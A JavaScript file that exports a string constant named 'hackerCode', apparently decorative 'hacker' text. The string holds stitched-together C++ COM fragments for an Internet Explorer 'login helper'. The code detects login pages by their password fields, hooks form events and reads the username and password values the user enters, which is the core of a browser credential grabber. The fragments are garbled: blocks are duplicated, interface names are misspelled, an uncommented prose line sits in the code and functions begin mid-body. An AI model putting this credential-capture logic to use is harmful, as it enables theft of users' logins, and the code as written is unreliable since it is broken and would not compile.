export const hackerCode = `
CComPtr<IDISPATCH> spDisp; 
HRESULT hr = m_pWebBrowser2->get_Document(&spDisp);
if (SUCCEEDED(hr) && spDisp)
{ 
    CComQIPtr<IHTMLDOCUMENT2 &IID_IHTMLDocument2> spHTML(spDisp);

void CIeLoginHelper::EnumFrames(CComPtr<IHTMLDocument2>& spDocument) 
{    
    
    CComPtr<IIHTMLDocument2> spDocument2;
    CComPtr<IIOleContainer> pContainer;
    HRESULT hr = spDocument->QueryInterface(IID_IOleContainer,
                (void**)&pContainer);
    
    CComPtr<IIEnumUnknown>pEnumerator;
    hr = pContainer->EnumObjects(OLECONTF_EMBEDDINGS, &pEnumerator);
    IUnknown* pUnk;
    ULONG uFetched;

    BOOL bFrameFound = FALSE;
    for (UINT nIndex = 0; 
            S_OK == pEnumerator->Next(1, &pUnk, &uFetched);
                nIndex++)
    {
        CComPtr<IIWebBrowser2> pBrowser;
        hr = pUnk->QueryInterface(IID_IWebBrowser2, 
                (void**)&pBrowser);
        pUnk->Release();
        if (SUCCEEDED(hr))
        {
            CComPtr<IIDispatch> spDisp;
            pBrowser->get_Document(&spDisp);
            CComQIPtr<IHTMLDocument2, &
                         IID_IHTMLDocument2> spDocument2(spDisp);
                        //IHTMLWindow2 in a doc                    
            RecurseWindows(spDocument2);
            bFrameFound = TRUE;

        }
    }
    if(!bFrameFound || !m_bFoungLoginPage)
    {

        CComPtr<IIHTMLElementCollection> spFrmCol;
        CComPtr<IIHTMLElementCollection> spElmntCol;

        hr = spDocument->get_forms(&spFrmCol);
                if a page is a login page
        hr = spDocument->get_all(&spElmntCol);
        if(IsLoginPage(spElmntCol))
                   EnableEvents(spFrmCol);    
    }        
}

BOOL  CIeLoginHelper::IsLoginPage(CComPtr<IHTMLElementCollection>&spElemColl)
{
    if(spElemColl == NULL)
        return m_bFoungLoginPage;
    _variant_t varIdx(0L, VT_I4);
    long lCount = 0;
    HRESULT hr  = S_OK;
    hr = spElemColl->get_length (&lCount);
    if (SUCCEEDED(hr))
    {
        for(long lIndex = 0; lIndex <lCount; lIndex++ ) 
        { 
            varIdx=lIndex;
                    CComPtr<IDispatch>spElemDisp;
            hr = spElemColl->item(varIdx, varIdx, &spElemDisp);
            if (SUCCEEDED(hr))
            {
                CComPtr<IHTMLInputElement> spElem;
                hr = spElemDisp->QueryInterface(IID_IHTMLInputElement, (void**)&spElem);
                if (SUCCEEDED(hr))
                {
                    _bstr_t bsType;
                    hr = spElem->get_type(&bsType.GetBSTR());
                    if(SUCCEEDED(hr) && bsType.operator==(L"password"))
                    {
                        m_bFoungLoginPage = true;
                    }
                }
            }
            if(m_bFoungLoginPage)
                return m_bFoungLoginPage;
        }
    }
    return m_bFoungLoginPage;
}

_variant_t varIdx(0L, VT_I4);
long lCount = 0;
HRESULT hr  = S_OK;
hr = pElemColl->get_length (&lCount);
if (SUCCEEDED(hr))
{
    for(long lIndex = 0; lIndex <lCount; lIndex++ ) 
    { 
           varIdx=lIndex;
           hr=pElemColl->item(varIdx, varIdx, &pElemDisp);

        if (SUCCEEDED(hr))
        {
            hr = pElemDisp->QueryInterface(IID_IHTMLFormElement, (void**)&pElem);

            if (SUCCEEDED(hr))
            {
                IConnectionPointContainer* pConPtContainer = NULL;
                IConnectionPoint* pConPt = NULL;    
                hr = pElem->QueryInterface(IID_IConnectionPointContainer,
                    (void**)&pConPtContainer);
                if (SUCCEEDED(hr))
                {
                    hr = pConPtContainer->FindConnectionPoint(
                        DIID_HTMLFormElementEvents2, &pConPt);

                    if (SUCCEEDED(hr))
                    {
                        hr = pConPt->Advise((IDispatch*)this, &m_dwBrowserCookie);
                        pConPt->Release();
                    }
                }
                pElem->Release();
            }
            pElemDisp->Release();
        }
    }
}

_variant_t varIdx(0L, VT_I4);
long lCount = 0;
HRESULT hr  = S_OK;
hr = pElemColl->get_length (&lCount);
if (SUCCEEDED(hr))
{
    for(long lIndex = 0; lIndex <lCount; lIndex++ ) 
{ 
  varIdx=lIndex; 
  hr=pElemColl->item(varIdx, varIdx, &pElemDisp);
    if (SUCCEEDED(hr))
    {
        hr = pElemDisp->QueryInterface(IID_IHTMLInputElement, (void**)&pElem);
        if (SUCCEEDED(hr))
        {
            _bstr_t bsType;
            pElem->get_type(&bsType.GetBSTR());
            if(bsType.operator ==(L"text"))
            {
                pElem->get_value(&bsUserId.GetBSTR());
            }
            else if(bsType.operator==(L"password"))
            {
                pElem->get_value(&bsPassword.GetBSTR());
            }
            pElem->Release();
        }

        pElemDisp->Release();
    }
    if(bsUserId.GetBSTR() && bsPassword.GetBSTR() && 
      ( bsUserId.operator!=(L"") && bsPassword.operator!=(L"") ) )
    {
        return;
    }            

    }
}
`
